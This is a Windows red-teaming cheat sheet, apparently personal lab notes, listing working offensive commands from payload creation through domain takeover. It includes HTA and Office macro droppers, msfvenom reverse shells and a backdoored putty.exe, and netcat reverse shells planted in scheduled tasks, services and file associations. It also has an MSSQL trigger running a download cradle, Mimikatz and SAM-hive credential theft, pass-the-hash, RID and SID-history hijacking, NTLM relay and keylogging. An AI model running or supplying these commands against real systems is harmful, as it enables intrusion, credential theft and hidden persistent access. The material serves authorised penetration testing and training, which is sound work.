# RT-CHEATSHEET
# Windows Red Teaming Related Shit
Weaponization
# Vbs
Sample Payload<br>
Set shell = WScript.CreateObject("Wscript.Shell")<br>
 shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True<br>
 shell.Run("C:\Windows\System32\cmd.exe " & WScript.ScriptFullName),1,True<br>
## Run<br>
  wscript hello.vbs<br>
  wsccript /e:VBScript payload.txt

# Hta
Sample<br>
<html><br>
<body><br>
<script><br>
    // var c= 'cmd.exe'<br>
  var c = "powershell iwr -uri 'http://10.10.14.6/customshell.exe' -Outfile C:\\Windows\\Tasks\\a.exe;C:\\Windows\\Tasks\\a.exe -e cmd.exe"<br>
    new ActiveXObject('WScript.Shell').Run(c);<br>
</script><br>
</body><br>
</html><br>
## Generate Payload
Serve hta with web server (eg. python)<br>

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o xxx.hta<br>
## Metasploit Create And Serve Hta<br>
use exploit/windows/misc/hta_server<br>

## Vbs
Basic Payload<br>
Sub Document_Open()<br>
  EXECUTE<br>
End Sub<br>
<br>
Sub AutoOpen()<br>
  EXECUTE<br>
End Sub<br>
<br>
Sub EXECUTE()<br>
   MsgBox ("Welcome to My Room!")<br>
End Sub<br>
<br>
Sub EXECUTE()<br>
    Dim payload As String<br>
    payload = "calc.exe"<br>
    CreateObject("Wscript.Shell").Run payload,0<br>
End Sub<br>
### Msfvenom<br>
### Note: if using .doc files change WorkbookOpen to Documentopen If using excel, no changes needed<br>
<br>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
# Powershell
## With PowerCat

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c 10.10.10.10 -p 1337 -e cmd"<br>
# Enum
## Powershell
Change Keyboard Layout<br>
powershell -command "Set-WinUserLanguageList -Force 'fi-FI'"<br>
## Check For Antivirus/Windows Defender<br>
wmic /namespace:\\root\securitycenter2 path antivirusproduct<br>
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct<br>
Get-Service WinDefend<br>
Get-MpComputerStatus | select RealTimeProtectionEnabled<br>
Get-MpThreat<br>
## EDR Checker
https://github.com/PwnDexter/SharpEDRChecker<br>

## Check For Firewall
Get-NetFirewallProfile | Format-Table Name, Enabled<br>
## Disable Firewall<br>
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False<br>
Get-NetFirewallProfile | Format-Table Name, Enabled<br>
## Firewall Rules<br>
Get-NetFirewallRule | select DisplayName, Enabled, Description<br>
Get-NetFirewallRule | findStr "Rule-name"<br>
## Test Connection<br>
Test-NetConnection -ComputerName 127.0.0.1 -Port 80<br>
## EDR Checkers
<a href="https://github.com/PwnDexter/Invoke-EDRChecker" />Invoke-EDRChecker</a> SharpEDRChecker<br>

## Network Enum
netstat -na<br>
arp -a<br>
ipconfig<br>
ipconfig /all<br>
## General
systeminfo<br>
whoami /priv<br>
whoami<br>
whoami /groups<br>
## Smb
net share<br>
## Users
net user <br>
net group<br>
net localgroup<br>
net localgroup administrators<br>
## Updates
wmic qfe get Caption, Description<br>
## Credentials
reg query HKLM /f password /t REG_SZ /s<br>
reg query HKCU /f password /t REG_SZ /s<br>
cat C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br>
Get-AdUser -Filter * -Properties * | Select Name, Description<br>
## Credentials Mimikatz
sekurlsa::logonpasswords<br>
If We Get 0x00005 Error Then:<br>
!processprotect /process:lsass.exe /remove<br>
!+<br>
sekurlsa::logonpasswords<br>
# Active Directory
## Basic
## Note: use run-tool to check MMC if rdp is available

systeminfo | findstr Domain<br>
Get-ADUser -Filter *<br>
Get-ADUser -Filter * -SearchBase "CN=Users,DC=domain,DC=COM"<br>
Get-ADUser -Filter * -SearchBase "OU=DOM,DC=domain,DC=COM"<br>
Get-ADUser -Identity username -Server domain.local -Properties * <br>
Get-ADUser -Filter 'Name -like "*stevens"' -Server domain.local | Format-Table Name,SamAccountName -A<br>
Get-ADGroup -Identity Administrators -Server domain.local<br>
Get-ADGroupMember -Identity Administrators -Server sa.domain.local<br>
$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)<br>
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server sa.domain.local<br>
Get-ADObject -Filter 'badPwdCount -gt 0' -Server sa.domain.local<br>
Get-ADDomain -Server sa.domain.local<br>

## Change password of user 
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)<br>

dir \\sa.domain.local\SYSVOL\ (check for password files, certificates and other excel files) <br>
net user /domain<br>
net user zoe.marshall /domain<br>
net group /domain<br>
net group "Tier 1 Admins" /domain<br>
net accounts /domain<br>

## Event Log / Sysmon
Get-EventLog -List<br>
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }<br>
Get-Service | where-object {$_.DisplayName -like "*sysm*"}<br>
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational<br>
findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*<br>
## Applications / Services
wmic product get name,version<br>
Get-ChildItem -Hidden -Path C:\Users\xxx\Desktop\<br>
net start<br>
wmic service where "name like 'ABC Service'" get Name,PathName<br>
Get-Process -Name "name-service"<br>
netstat -noa |findstr "LISTENING" |findstr "PID"<br>
## Dns Zone Transfer
nslookup<br>
--> server 10.10.0.10<br>
--> ls -d domain.local<br>
<br>
# Priv Esc
### Good automation scripts (these can be noisy)<br>

https://github.com/bitsadmin/wesng<br>
https://github.com/itm4n/PrivescCheck<br>
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS<br>
multi/recon/localexploitsuggester (metasploit)<br>
## Files To Check<br>
C:\Unattend.xml<br>
C:\Windows\Panther\Unattend.xml<br>
C:\Windows\Panther\Unattend\Unattend.xml<br>
C:\Windows\system32\sysprep.inf<br>
C:\Windows\system32\sysprep\sysprep.xml<br>
C:\ProgramData\McAfee\Agent\DB\ma.db<br>
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br>
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config<br><br>
## Saved Credentials
cmdkey /list<br>
runas /savecred /user:admin cmd.exe<br>
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s<br>
## Quick Wins (Ctf Style)
### Check for tasks and see if we can write on any of of their location

##List of tasks
schtasks<br>
##Info about specific task (eg. pathname)
schtasks /query /tn vulntask /fo list /v <br>
##Check write access
icacls c:\tasks\schtask.bat<br>
##try to run task
schtasks /run /tn vulntask<br>
## Check AlwaysInstallElevated<br>
## IF both of these are set good to go<br>

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br>
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br>
## Generate payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.13.22 LPORT=LOCAL_PORT -f msi -o malicious.msi<br>
## Execute
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi<br>

# Services
### If we can write to any location where service-executables are located, overwrite them and get a shell/session<br>
### Also, check for quotes on BINARYPATHNAME - property, if there are no quotes but spaces we can abuse this since space is argument separator

#### EG

BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe<br>
Can be intercepted as<br>

C:\MyPrograms\Disk arg1 arg2<br>
and so on<br>

Also, test accesschk if we can edit the service itself (check for SERVICEALLACCESS)<br>

## See Config
sc qc apphostsvc<br>
## Edit Config (Might Not Have Rights)<br>
sc config THMService binPath= "C:\Users\thm-unpriv\Desktop\rev-svc.exe" obj= LocalSystem<br>
## Registry
On registry editor goto:<br><br>

HKLM\SYSTEM\CurrentControlSet\Services\<br>
Imagepath = Path to run ObjectName = runner<br>

## Check For Permissions
icacls C:\PROGRA~2\SYSTEM~1\WService.exe<br>
## Generate Service Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4445 -f exe-service -o rev-svc.exe<br>
## Overwrite Service With Our Payload
cp C:\Users\thm-unpriv\Desktop\rev-svc.exe WService.exe<br>
Give Permissions To Our New Payload<br>
icacls WService.exe /grant Everyone:F<br>
Restart Our Service If We Can<br>
##On cmd.exe<br>
sc stop windowsscheduler<br>
sc start windowsscheduler<br>

# Privilege Abusing
## Check with

whoami /priv<br>
## SeBackup / SeRestore
First Cp Hive Files:<br>
reg save hklm\system C:\Users\sysbackup\system.hive<br>
reg save hklm\sam C:\Users\sysbackup\sam.hive<br>
Send Them To Attacker Host (Eg Smb)<br>
copy C:\Users\sysbackup\sam.hive \\10.11.23.111\public\<br>
copy C:\Users\sysbackup\system.hive \\10.11.23.111\public\<br>
Use Impacket's Secretsdump To Dump Hashes<br>
secretsdump.py  -sam sam.hive -system system.hive LOCAL<br>
Use Hashes (Eg. Psexec From Impacket)<br>
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.121.162<br>

## SeTakeOwnership
### Abuse Utilman.exe
### Take Control
takeown /f C:\Windows\System32\Utilman.exe<br>
### Give Privilege To Yourself
icacls C:\Windows\System32\Utilman.exe /grant UserTakeOwnership:F<br>
Rewrite Utilman<br>
copy cmd.exe utilman.exe<br>
#### After these steps lock your computer and press Ease of access button!<br>

## SeImpersonate
There are many exploits for this, try using JuicyPotato or RoguePotato, PrintSpoofer, JuicyPotatoNG<br>

# Unpatched Software<br>
## Check Installed Products<br>
wmic product get name,version,vendor<br>
Find for CVE:s online<br>

# Pivoting
### Running Commands As Another User
## PSExec<br>
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe<br>

## WinRS<br>
### When WinRM is enabled Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)<br>
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd<br>

## SMBCLIENT
smbclient -c 'put myinstaller.msi' -U username -W ZA '//server.sa.domain.local/admin$/' password<br>
 putting file myinstaller.msi as \myinstaller.msi<br>
 
 ## PowerShell
$username = 'Administrator';<br>
$password = 'Mypass123';<br>
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; <br>
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;<br>
Enter-PSSession -Computername TARGET -Credential $credential<br>
or<br>
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}<br>

## WMI
$Opt = New-CimSessionOption -Protocol DCOM<br>
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop<br>
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";<br>
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}<br>
### WMI (LEGACY)<br>
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" <br>

## Sc
### Ports: 135/TCP, 49152-65535/TCP (DCE/RPC) 445/TCP (RPC over SMB Named Pipes) 139/TCP (RPC over SMB Named Pipes)
#### Administrator required
### Note: sc doesn't work with SSH, spawn another shell (eg netcat) before using this
Start:<br>
sc.exe \\TARGET create servicename binPath= "net user munra Pass123 /add" start= auto<br>
sc.exe \\TARGET start servicename<br>
Shut Down:<br>
sc.exe \\TARGET stop servicename<br>
sc.exe \\TARGET delete servicename<br>

## Scheduled Tasks
### Same restrictions as sc
#### To Start:
schtasks /s TARGET /RU "SYSTEM" /create /tn "task1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 <br>

schtasks /s TARGET /run /TN "task1" <br>
## To Shutdown
schtasks /S TARGET /TN "THMtask1" /DELETE /F<br>

# Persistence
## Also Check Out:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md

## Add User To Admin Group
net localgroup administrators thmuser0 /add<br>
## Add To Backup Operators Group
### Note: Backup operators can read any file on machine which essentially means admin access, also adding to Remote Management Users group so we can RDP and WinRM. Also, UAC makes some restrictions when logging in remotely so update a register key<br>
### Setup
net localgroup "Backup Operators" user1 /add<br>
net localgroup "Remote Management Users" user1 /add<br>
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1<br>
After Login (Using Evil-WinRM )<br>
Get Sam & System Files<br>
reg save hklm\system system.bak<br>
reg save hklm\sam sam.bak<br>
download system.bak<br>
download sam.bak<br>
### Dump Hashes
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL<br>
# Special Privileges
#### We basically add SeBackupPrivilege and SeRestorePrivilege to our account<br>

## Export Current Config For Editing<br>
secedit /export /cfg config.inf<br>
notepad config.inf<br>
## Add Our Username To SeBackupPrivilege And SeRestorePrivilege Lines
### Note: using username is fine

## Import Our New Config
secedit /import /cfg config.inf /db config.sdb<br>
secedit /configure /db config.sdb /cfg config.inf<br>

## Modify WinRM Service So We Can Login Via WinRm
### Add our user and give it full control via UI.
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI<br>

# RID Hijacking
We basically update registry values in a way that system thinks we are administrator<br>

## Find RID For Our User
Note: RID is last number set after last - of the SID<br>
wmic useraccount get name,sid<br>
## Edit Our Registry Value
Note: PsExec64 needed<br>
Open Registry Editor<br>
PsExec64.exe -i -s regedit<br>
Navigate To Correct Folder<br>
<b>Note: RID here is hex-presentation of our previously found RID<br></b>
HKLM\SAM\SAM\Domains\Account\Users\RID<br>
Edit F Value<br>
Find RID value from registry and change it to F4 01 (500 in decimal)<br>


# Backdoors Via Files
## Replace Commonly Used Program (Eg. Putty.Exe) With Tampered Version:
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe<br>
Edit Shortcut To Execute Mal Program<br>
Create A Small Script To Execute Wanted Program With Our Backdoor<br>
Store in Windows/System32/backdoor.ps1 for example<br>

Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe IP 4445"<br>

C:\Windows\System32\calc.exe<br>
### Edit Shortcut Target
### Note: you may need to update the icon after this to be more sneaky.

powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1<br>

# Hijacking File Associations
## Basically this way we can get our backdoor to get executed everytime a certain file extension is opened!

### Sample Backdoor File
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"<br>
C:\Windows\system32\NOTEPAD.EXE $args[0]<br>
Find Extenions Prog Id In Registry Editor<br>
Note: .txt is example<br>

Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.txt<br>
The ProgID is (Default)-fields Data-value<br>

## Find Shell Command Of The ProgId In Registry Editor
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\{PROGID}<br>
Change shell/open/command entry to execute our backdoor<br>

powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1<br>
# Services Create
Generate Service Executable (Eg With Msfvenom)<br>
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe<br>
## Create Service And Start It
sc.exe create service2 binPath= "C:\windows\rev-svc.exe" start= auto<br>
sc.exe start service2<br>
 
## Service Modify
### The plan is to find a stopped service that has STARTTYPE automatic, SERVICESTART_NAME is the user account which service runs on

### Find A Stopped Service
sc.exe query state=all<br>
See Service Properties<br>
sc.exe qc Service3<br>
### Edit Service
sc.exe config service3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"<br>
 
# Scheduled Tasks
## Create Task
schtasks /create /sc minute /mo 1 /tn TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.10.90.206 4449" /ru SYSTEM<br>
## Make Task Invisible
Edit Registery Value<br>
Location:<br>

Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TASKNAME}<br>
 
Delete SD-value<br>

# Execute On User Logon
Add new REGEXPANDSZ registry field in one of these, set Data to be path to your executable<br>

HKCU\Software\Microsoft\Windows\CurrentVersion\Run<br>
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce<br>
HKLM\Software\Microsoft\Windows\CurrentVersion\Run<br>
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce<br>
 ## OR append UserInit or Shell registry on

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\<br>
 ## OR add new regsitry "UserInitMprLogonScript" ON
HKCU\Environment<br>
 
# MSSQL
 use impackets module mssqlclient or heidi<br>
 ## IF ONLY READ PERMISSION
 ### PERFORM LLMNR/NBT-NS by:
 <br>xp_dirtree //attackerip/sharenotexist
 <br>on new terminal use
 <br> responder -I interface -wPv<br>
 on executing dirtree command you'll get the ntlmv2 hash on your responder, crack it and enjoy
## ANOTHER WAY On MSSQL Session Execute Queries:
sp_configure 'Show Advanced Options',1;<br>
RECONFIGURE;<br>
sp_configure 'xp_cmdshell',1;<br>
RECONFIGURE;<br>
### After:
USE master<br>

GRANT IMPERSONATE ON LOGIN::sa to [Public];<br>
## Configure Trigger
 
USE HRDB<br>
CREATE TRIGGER [sql_backdoor]<br>
ON HRDB.dbo.Employees <br>
FOR INSERT AS<br>

EXECUTE AS LOGIN = 'sa'<br>
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://10.10.117.195:8000/evilscript.ps1'')"';<br>
 
# Powershell Disabled
Use https://github.com/Mr-Un1k0d3r/PowerLessShell.git<br>

## Generate Payload
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=IP LPORT=4443 -f psh-reflection > liv0ff.ps1<br>
Metasploit 1 Liner For Listener<br>
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost ip;set lport 4443;exploit"<br>
## Generate Final Payload
python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj<br>
## Use Msbuild To Build Payload
MSBuild.exe liv0ff.csproj<br>
 
# Exploiting AD
## Constrained Delegation
Check If Anyone Can Delegate Anything<br>
Get-NetUser -TrustedToAuth<br>
Get Hash/Password Of The User Who Can Delegate<br>
mimikatz.exe<br>
token::elevate<br>
lsadump::secrets<br>
 
## Use Kekeo or rubeus To Generate Tickets
kekeo.exe<br>
tgt::ask /user:svcIIS /domain:domain.local /password:ADD_PASSWORD_HERE<br>
tgs::s4u /tgt:TGT_svcIIS@domain.local_krbtgt~domain.local@DOMAIN.LOCAL.kirbi /user:t1_trevor.jones /service:http/SERVER1.domain.local<br>
tgs::s4u /tgt:TGT_svcIIS@DOMAIN.LOCAL_krbtgt~domain.local@DOMAIN.LOCAL.kirbi /user:t1_trevor.jones /service:wsman/SERVER1.domain.local<br>
## Re Enter Mimikatz And Use Tickets
kerberos::ptt TGS_t1_trevor.jones@DOMAIN.LOCAL_wsman~SERVER1.DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi
kerberos::ptt TGS_t1_trevor.jones@DOMAIN.LOCAL_http~SERVER1.DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi
exit 
### note, this can be directly done (ptt) with rubeus in few steps
 for reference check: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation
### to verify if it's done successfully type in cmd:<br>
 klist<br>
## for lateral movement<br>
### Enter Into A New Session With The Generated Ticket<br>
Enter-PSSession -ComputerName server1.domain.local<br>

# Automatic Relays (Printer Bug)
We need:<br>
A valid set of AD account credentials.<br>
Network connectivity to the target's SMB service.<br>
The target host must be running the Print Spooler service.<br>
The hosts must not have SMB signing enforced.<br>
## Check For Machine Accounts (BLoodhound Query)
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p<br>
## Check For Print Spooler
Get-PrinterPort -ComputerName server2.domain.local<br>
OR <br>
GWMI Win32_Printer -Computer server2.domain.local<br>
## Check For SMB Signing<br>
nmap --script=smb2-security-mode -p445 server1.domain.local server2.domain.local<br>
## in kali
### Exploit
python3 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"OWNED-TARGET-IP" -debug<br>
SpoolSample.exe TARGET-DOMAIN-NAME "Attacker IP"<br>
python3 ntlmrelayx.py -smb2support -t smb://"OWNED-TARGET-IP" -c 'whoami /all' -debug<br>

# Exploit Users (Keylogger)
<b>Note: sometimes it's good idea to move to less privileged users instead of sticking to admin<br>
Also, we'll be using metasploit modules for this<br></b>
## Find Processes That User Is Running<br>
 ps | grep "explorer"<br>
 Migrate To Process<br>
migrate *PID* <br>
Start Keylogger<br>
keyscan_start<br>

 # Exploit GPO
Check access via Bloodhound, you can use mmc tool via RDP to access and edit GPOs<br>
# Inter-Realm TGTs
 <b>DOMAIN ADMIN REQUIRED<br></b>

We need:<br>

The KRBTGT password hash<br>
The FQDN of the domain<br>
The username of the account we want to impersonate<br>
The Security Identifier (SID) of the domain<br>
KRBTGT Password Hash<br>
mimikatz.exe<br>
 lsadump::dcsync /user:DOMAIN\krbtgt<br>
 
Get-ADComputer -Identity "DC"<br>
Get-ADGroup -Identity "Enterprise Admins" -Server dc.domain.local<br>
 
# PERSISTENCE
 ## SID HISTORY
 Basically this makes low priv user a Domain Admin<br>
 Check SID History Of User<br>
Get-ADUser phillip.wilkins -properties sidhistory,memberof<br>
Get SID Of The Domain Admins<br>
Get-ADGroup "Domain Admins"<br>
Patch History<br>
Stop-Service -Name ntds -force <br>
Add-ADDBSidHistory -SamAccountName 'phillip.wilkins' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\Windows\NTDS\ntds.dit <br>
Start-Service -Name ntds<br>
 
## Group Memberships
### Create Nested ADGroup
New-ADGroup -Path "OU=IT,OU=People,DC=DOMAIN,DC=LOCAL" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security<br>
New-ADGroup -Path "OU=SALES,OU=People,DC=DOMAIN,DC=LOCAL" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security <br>
### Add Last Group To Domain Admins Group
Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"<br>
Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup2"<br>
Add User To The First Group<br>
Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"<br>
### Verify if That  Worked:
Get-ADGroupMember -Identity "Domain Admins"<br>
<br><br>
 # AD CHEATSHEET
 https://wadcoms.github.io/#
## Breaching
### LDAP Pass-Back Attack
Can be used if any other service uses AD LDAP and we can trick it to connect to our own malicious LDAP server instead of the target's<br>
<b>Install Slapd</b><br>
 sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd<br>
 <b>Reconfigure Each Time</b><br>
 <b>Note: set domains to match targets domain!!</b><br>

sudo dpkg-reconfigure -p low slapd<br>
## Create A New File With This Content And Save It As Conf.Ldif For Example<br>
olcSaslSecProps.ldif<br>
dn: cn=config<br>
replace: olcSaslSecProps<br>
olcSaslSecProps: noanonymous,minssf=0,passcred<br>
Restart Service With Oud New Config<br>
ldapmodify -Y EXTERNAL -H ldapi:// -f ./oldSaslSecProps.ldif && service slapd restart<br>
Listen For Our Tcp Traffic On Port 389 To Get Creds<br>
sudo tcpdump -SX -i breachad tcp port 389<br>
# Retreive Credentials From PXE Boot Image
<b>Note: this is not too common vulnerability I think</b><br>

After receiving the file name of the image eg. x64{50364AB9-F5EF-4DAF-9501-1FE668B8691D}.bcd<br>

Download It Via Tftp<br>
tftp -i <IP> GET "\Tmp\x64{50364AB9-F5EF-4DAF-9501-1FE668B8691D}.bcd " conf.bcd<br>
 
 ## <b>Read Contents via <a href="https://github.com/wavestone-cdt/powerpxe"> PowerPxe</a></b>
 Import-Module .\PowerPXE.ps1<br>
$BCDFile = "conf.bcd"<br>
Get-WimFile -bcdFile $BCDFile<br>
Download The Image Itself<br>
tftp -i <TARGET IP> GET "<PXE Boot Image Location>" pxeboot.wim<br>
Find Credentials Inside Image<br>
Get-FindCredentials -WimFile pxeboot.wim<br>

# PASS THE HASH(PTH)
 xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH<br>
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP<br>
 or use wmiexec(undetected)<br>
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH<br>
 
 
# SMB CHEATS
 smbclient -L \\10.129.1.39 -N (LIST SHARES (NULL SESSION))<br>
 ## LOGIN TO SMB
 smbclient  "//10.129.1.39/Backups" -N<br>
## LIST SHARES
 crackmapexec smb  10.129.1.39 -u "user" -p "password"  --shares<br>
smbmap -d DOMAIN -u USERNAME -p PASSWORD -H IP<br>
 <b> NOTE: sometimes when you don't find 445 opened port using nmap, try using smbmap with user details, it might work(PS: worked for me in a red teaming activity)</b><br>
 ## PASSWORD POLICY
 crackmapexec smb --pass-pol IP<br>
 ## MOUNTING SMB SHARES
 sudo mount -t cifs //<vpsa_ip_address>/<export_share> /mnt/<local_share><br>
 ## MOUNTING VHD IMAGE
  sudo guestmount --add <vhdfile>.vhd --inspector --ro /mnt/<location> -v<br>
 
# FEW MORE ENUMERATION SCRIPTS( BLOODHOUND AND POWERVIEW ARE MANDATORY)
 https://github.com/GhostPack/Seatbelt (build on different dotnet if needed)<br>
https://github.com/411Hall/JAWS<br>
https://github.com/rasta-mouse/Sherlock<br>
https://github.com/rasta-mouse/Watson<br>
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS<br>
https://github.com/AonCyberLabs/Windows-Exploit-Suggester <br>

# KERBEROS ATTACK PATHS AFTER ANALYSING BLOODHOUND RESULTS
   GetNPUsers.py -dc-ip <ip-address> -request '<domain>/' (NULL SESSION)<br>
  GetUserSPNs.py -dc-ip <ip-address> -request <domain>/<username> (AUTH)<br>
 
# DOWNLOADING AND EXECUTING FILES
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.98:8000/sherlock.ps1' ) | powershell -noprofile -<br>
echo IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.98:8000/winPEAS.exe', 'winPEAS.exe') | powershell <br>
certutil -f -urlcache http://IP:PORT/filename file.exe<br>
powershell Invoke-WebRequest -UseBasicParsing 10.10.16.8:8000/winPEASx64.exe -OutFile winPEASx64.exe<br>

# LLMNR/NBTNS POISONING
 reference:https://predatech.co.uk/llmnr-nbt-ns-poisoning-windows-domain-environments/<br>
 for windows instead of responder use <b> inveigh</b><br>
 reference: https://infinitelogins.com/2020/11/16/capturing-relaying-net-ntlm-hashes-without-kali-linux-using-inveigh/<br>
 commands:
 https://dmcxblue.gitbook.io/red-team-notes/untitled-1/llmnr-nbt-ns-poisoning-and-relay

